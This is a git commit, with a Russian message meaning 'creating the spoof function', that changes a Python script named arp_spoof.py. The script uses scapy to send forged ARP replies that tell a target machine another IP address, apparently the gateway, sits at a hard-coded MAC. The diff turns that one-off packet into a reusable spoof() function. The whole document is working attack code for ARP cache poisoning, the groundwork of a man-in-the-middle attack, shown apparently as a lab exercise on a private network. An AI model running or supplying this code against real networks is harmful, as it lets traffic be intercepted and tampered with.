27bd5c57253575066e124b25ebca9c4809c857a8
em0ji <roxi.xyz@gmail.com>
2021-10-04 14:15:52 -0400

    Создаём функцию spoof

--- arp_spoof/arp_spoof.py
+++ arp_spoof/arp_spoof.py
@@ -2,6 +2,6 @@
 
 import scapy.all as scapy
 
-packet = scapy.ARP(op=2, pdst="10.0.2.7", hwdst="08:00:27:8a:21:73", psrc="10.0.2.1")
-scapy.send(packet)
-
+def spoof(target_ip, spoof_ip):
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="08:00:27:8a:21:73", psrc=spoof_ip)
+    scapy.send(packet)
